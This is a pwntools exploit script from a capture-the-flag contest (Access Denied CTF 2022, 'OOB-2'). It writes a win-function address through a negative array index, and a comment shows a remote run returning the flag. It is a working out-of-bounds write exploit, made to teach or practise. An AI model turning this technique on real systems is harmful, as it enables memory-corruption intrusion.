from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './oob2'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.71.207.70"
  PORT = 9337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)


s.sendlineafter("Enter the index: ", "-156")

s.sendlineafter("Enter the value: ", str(elf.sym.win))

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_OOB-2$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_OOB-2/oob2'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 34.71.207.70 on port 9337: Done
[*] Switching to interactive mode
accessdenied{f1n1_4rr4y5_h4s_d0n3_th3_m4g1c_155ab68a}
'''
